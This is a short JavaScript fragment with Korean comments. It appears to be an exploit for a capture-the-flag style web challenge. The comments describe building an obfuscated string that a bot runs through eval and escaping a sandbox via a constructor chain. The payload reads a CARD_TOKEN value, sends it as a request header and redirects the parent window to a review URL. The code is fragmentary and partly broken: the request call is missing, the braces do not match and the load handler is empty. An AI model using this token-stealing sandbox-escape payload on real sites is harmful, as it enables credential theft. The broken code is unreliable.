        // <script> 태그를 절대 쓰지 않고, 봇이 내부 eval로 실행할 순수 문자열만 구성합니다.
        const actualAttack =

                'headers: {' +
                    '["X-Card-" + "Token"]: window["CARD_" + "TOKEN"],' +

                '},' +

            '["th" + "en"](r => r["te" + "xt"]())' +

                'window["par" + "ent"]["loca" + "tion"]["hr" + "ef"] = "http://localhost:5000/review?widget=" + name;' +
            '});';

        // 샌드박스를 우회하여 원시 전역 객체(eval)를 싱크하는 최상위 원시 함수 실행문
        const payload = '(Math["con" + "constructor"]["con" + "constructor"]("return eval")()(' + JSON.stringify(actualAttack) + '))';

        // 봇 환경에서 iframe 로드가 완료되는 순간 안전하게 postMessage 전송 (SOP 정책 준수)
        iframe.addEventListener("load", function() {

        });
